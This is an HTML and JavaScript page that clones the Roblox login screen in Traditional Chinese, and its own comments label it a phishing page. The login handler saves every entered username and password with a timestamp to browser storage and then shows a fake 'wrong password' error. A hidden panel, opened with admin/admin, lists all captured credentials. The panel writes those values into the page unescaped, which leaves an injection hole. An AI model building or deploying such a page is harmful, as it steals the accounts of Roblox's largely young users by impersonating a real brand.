<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>登入 Roblox</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            background-color: #111214;
            overflow: hidden; /* 防止背景滾動 */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }
        
        /* 傾斜背景圖塊網格設定 */
        .bg-grid-wrapper {
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            transform: rotate(-12deg);
            z-index: -2;
            pointer-events: none;
        }
        .bg-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 12px;
            width: 100%;
            height: 100%;
            opacity: 0.45; /* 降低亮度以凸顯中間登入框 */
        }
        .tile {
            width: 100%;
            aspect-ratio: 1;
            background-size: cover;
            background-position: center;
            border-radius: 12px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.8);
        }

        /* 輸入框的聚焦效果 */
        input:focus {
            outline: none;
            border-color: #ffffff;
            background-color: #111214;
        }
        input::placeholder {
            color: #888c90;
        }

        /* 自訂滾動條，讓管理員面板的表格好看點 */
        ::-webkit-scrollbar {
            width: 8px;
        }
        ::-webkit-scrollbar-track {
            background: #111214;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb {
            background: #393b3d;
            border-radius: 4px;
        }
        ::-webkit-scrollbar-thumb:hover {
            background: #4a4d50;
        }
    </style>
</head>
<body class="text-white flex flex-col h-screen relative">

    <!-- 傾斜遊戲圖塊背景 -->
    <div class="bg-grid-wrapper" aria-hidden="true">
        <div class="bg-grid" id="bg-grid"></div>
    </div>
    <!-- 黑色半透明遮罩層，讓畫面更暗一點 -->
    <div class="absolute inset-0 bg-black/50 z-[-1] pointer-events-none"></div>

    <!-- 頂部導航欄 (Navbar) -->
    <nav class="w-full h-14 bg-[#111214]/95 border-b border-gray-800 flex items-center justify-between px-6 z-50 fixed top-0">
        <!-- 左側：Logo 與 連結 -->
        <div class="flex items-center gap-6">
            <a href="#" class="text-white hover:text-gray-300 transition-colors">
                <!-- Roblox Logo SVG -->
                <svg viewBox="0 0 24 24" fill="currentColor" class="w-[30px] h-[30px]">
                    <path fill-rule="evenodd" clip-rule="evenodd" d="M5.275 2.5L2.5 18.725L18.725 21.5L21.5 5.275L5.275 2.5ZM13.842 13.626L10.373 14.22L9.779 10.751L13.248 10.158L13.842 13.626Z" />
                </svg>
            </a>
            
            <div class="hidden md:flex items-center gap-5 text-[15px] font-bold tracking-wide">
                <a href="#" class="hover:text-gray-300 transition-colors">圖表</a>
                <a href="#" class="hover:text-gray-300 transition-colors">市集</a>
                <a href="#" class="hover:text-gray-300 transition-colors">創作</a>
                <a href="#" class="hover:text-gray-300 transition-colors">Robux</a>
            </div>
        </div>

        <!-- 中間：搜尋欄 -->
        <div class="flex-1 max-w-[600px] mx-6 hidden md:block">
            <div class="relative flex items-center w-full h-[34px] rounded bg-[#232527] border border-transparent focus-within:border-white transition-colors">
                <svg class="w-[18px] h-[18px] ml-3 text-gray-400" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-4.35-4.35M17 10a7 7 0 11-14 0 7 7 0 0114 0z"></path>
                </svg>
                <input type="text" placeholder="搜尋" class="bg-transparent w-full h-full pl-3 pr-4 outline-none text-[15px] text-white">
            </div>
        </div>

        <!-- 右側：註冊按鈕 -->
        <div class="flex items-center">
            <button class="bg-[#3b82f6] hover:bg-blue-600 text-white px-4 py-[6px] rounded text-[15px] font-bold transition-colors">
                註冊
            </button>
        </div>
    </nav>

    <!-- 主要內容區 -->
    <main class="flex-1 flex items-center justify-center p-4 relative z-10 mt-14">
        
        <!-- 正常的登入視窗 -->
        <div id="login-window" class="bg-[#2b2d31] w-full max-w-[400px] rounded-lg p-8 shadow-2xl flex flex-col items-center">
            
            <h1 class="text-[26px] font-bold text-white mb-6">登入 Roblox</h1>
            
            <div class="w-full flex flex-col gap-4">
                <input 
                    type="text" 
                    id="username"
                    placeholder="使用者名稱 / 電子郵件地址 / 手機號碼" 
                    class="w-full bg-[#111214] border border-gray-600 rounded-lg px-4 py-[10px] text-[15px] text-white transition-colors"
                >
                
                <input 
                    type="password" 
                    id="password"
                    placeholder="密碼" 
                    class="w-full bg-[#111214] border border-gray-600 rounded-lg px-4 py-[10px] text-[15px] text-white transition-colors"
                >
                
                <!-- 釣魚紀錄用的錯誤訊息 (預設隱藏) -->
                <div id="error-message" class="hidden text-red-400 text-[14px] text-center w-full bg-red-500/10 border border-red-500/30 rounded-lg py-2 mt-1">
                    使用者名稱或密碼不正確。
                </div>

                <button id="login-btn" class="w-full border border-gray-400 text-gray-300 hover:bg-white/5 rounded-lg py-[10px] mt-1 transition-all duration-200 text-[15px] font-medium">
                    登入
                </button>
            </div>
            
            <div class="mt-4 mb-2">
                <a href="#" class="text-[13px] text-gray-400 hover:text-white transition-colors">
                    忘記密碼或使用者名稱？
                </a>
            </div>
            
            <!-- 次要登入方式按鈕 -->
            <div class="w-full flex flex-col gap-3 mt-4">
                <button class="w-full bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-lg py-[10px] transition-colors text-[14px] font-medium">
                    透過電子郵件給我一次性驗證碼
                </button>
                <button class="w-full bg-[#393b3d] hover:bg-[#4a4d50] text-white rounded-lg py-[10px] transition-colors text-[14px] font-medium">
                    快速登入
                </button>
            </div>
            
            <div class="mt-6 text-[14px] text-gray-400">
                沒有帳號？ <a href="#" class="text-white hover:underline transition-colors">註冊</a>
            </div>
        </div>

        <!-- 管理員模式面板 (預設隱藏) -->
        <div id="admin-panel" class="hidden bg-[#2b2d31] w-full max-w-[600px] rounded-lg p-8 shadow-2xl flex-col items-center">
            <h1 class="text-[26px] font-bold text-red-400 mb-2">管理員模式</h1>
            <p class="text-gray-400 text-sm mb-6">以下是所有用戶嘗試登入的帳號與密碼紀錄</p>

            <div class="w-full bg-[#111214] rounded-lg p-4 max-h-[300px] overflow-y-auto border border-gray-700">
                <table class="w-full text-left text-sm text-gray-300">
                    <thead class="sticky top-0 bg-[#111214] shadow-md">
                        <tr>
                            <th class="pb-2 pt-1 border-b border-gray-700 w-1/3">時間</th>
                            <th class="pb-2 pt-1 border-b border-gray-700 w-1/3">帳號</th>
                            <th class="pb-2 pt-1 border-b border-gray-700 w-1/3">密碼</th>
                        </tr>
                    </thead>
                    <tbody id="admin-records">
                        <!-- 紀錄會透過 JS 動態插入這裡 -->
                    </tbody>
                </table>
            </div>

            <div class="flex gap-4 mt-6 w-full">
                <button id="clear-records-btn" class="flex-1 bg-red-500 hover:bg-red-600 text-white py-[10px] rounded-lg text-[15px] font-bold transition-colors">
                    清除所有紀錄
                </button>
                <button id="close-admin-btn" class="flex-1 bg-[#3b82f6] hover:bg-blue-600 text-white py-[10px] rounded-lg text-[15px] font-bold transition-colors">
                    關閉並返回
                </button>
            </div>
        </div>

    </main>

    <script>
        // --- 1. 背景網格特效 ---
        document.addEventListener("DOMContentLoaded", () => {
            const grid = document.getElementById("bg-grid");
            const numberOfTiles = 200; 
            
            for (let i = 0; i < numberOfTiles; i++) {
                const tile = document.createElement("div");
                tile.className = "tile";
                tile.style.backgroundImage = `url('https://picsum.photos/seed/${i + 1000}/300/300')`;
                grid.appendChild(tile);
            }
        });

        // --- 2. 登入邏輯與釣魚紀錄功能 ---
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('login-btn');
        
        const loginWindow = document.getElementById('login-window');
        const errorMessage = document.getElementById('error-message');
        
        const adminPanel = document.getElementById('admin-panel');
        const adminRecordsTable = document.getElementById('admin-records');
        const closeAdminBtn = document.getElementById('close-admin-btn');
        const clearRecordsBtn = document.getElementById('clear-records-btn');

        // 從 localStorage 取得歷史紀錄 (模擬資料庫保存)
        let capturedData = JSON.parse(localStorage.getItem('roblox_captured_data')) || [];

        // 輸入框變色邏輯
        function checkInputs() {
            if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
                loginBtn.classList.remove('border-gray-400', 'text-gray-300', 'hover:bg-white/5');
                loginBtn.classList.add('bg-white', 'text-black', 'border-white', 'hover:bg-gray-200');
            } else {
                loginBtn.classList.add('border-gray-400', 'text-gray-300', 'hover:bg-white/5');
                loginBtn.classList.remove('bg-white', 'text-black', 'border-white', 'hover:bg-gray-200');
            }
        }

        usernameInput.addEventListener('input', checkInputs);
        passwordInput.addEventListener('input', checkInputs);

        // 登入按鈕點擊事件
        loginBtn.addEventListener('click', () => {
            const user = usernameInput.value;
            const pass = passwordInput.value;

            if (!user || !pass) return; // 如果沒輸入不作動

            if (user === 'admin' && pass === 'admin') {
                // 進入管理員模式
                errorMessage.classList.add('hidden');
                openAdminPanel();
            } else {
                // 一般使用者登入 -> 紀錄帳密並顯示錯誤
                const now = new Date();
                const record = {
                    time: now.toLocaleDateString() + ' ' + now.toLocaleTimeString(),
                    username: user,
                    password: pass
                };

                // 將紀錄推入陣列並儲存至瀏覽器
                capturedData.push(record);
                localStorage.setItem('roblox_captured_data', JSON.stringify(capturedData));

                // 顯示錯誤訊息
                errorMessage.classList.remove('hidden');

                // 可選：輸入錯誤後自動清空密碼
                passwordInput.value = '';
                checkInputs();
            }
        });

        // --- 3. 管理員面板功能 ---

        function openAdminPanel() {
            // 切換視窗顯示狀態
            loginWindow.classList.add('hidden');
            adminPanel.classList.remove('hidden');
            adminPanel.classList.add('flex'); // 確保面板以 flex 排版顯示

            // 渲染表格資料
            renderAdminTable();
        }

        function renderAdminTable() {
            adminRecordsTable.innerHTML = ''; // 清空現有內容

            if (capturedData.length === 0) {
                adminRecordsTable.innerHTML = `
                    <tr>
                        <td colspan="3" class="text-center py-6 text-gray-500">目前沒有任何用戶的登入紀錄。</td>
                    </tr>
                `;
                return;
            }

            // 反轉陣列，讓最新的紀錄顯示在最上面
            [...capturedData].reverse().forEach(data => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td class="py-3 border-b border-gray-800 text-gray-400">${data.time}</td>
                    <td class="py-3 border-b border-gray-800 font-medium text-blue-400 break-all pr-2">${data.username}</td>
                    <td class="py-3 border-b border-gray-800 font-medium text-red-400 break-all">${data.password}</td>
                `;
                adminRecordsTable.appendChild(tr);
            });
        }

        // 關閉管理員面板
        closeAdminBtn.addEventListener('click', () => {
            adminPanel.classList.add('hidden');
            adminPanel.classList.remove('flex');
            loginWindow.classList.remove('hidden');
            
            // 清空原本的輸入框
            usernameInput.value = '';
            passwordInput.value = '';
            checkInputs();
        });

        // 清除所有紀錄
        clearRecordsBtn.addEventListener('click', () => {
            if(confirm("確定要刪除所有紀錄嗎？此動作無法復原。")) {
                capturedData = [];
                localStorage.removeItem('roblox_captured_data');
                renderAdminTable();
            }
        });

    </script>
</body>
</html>
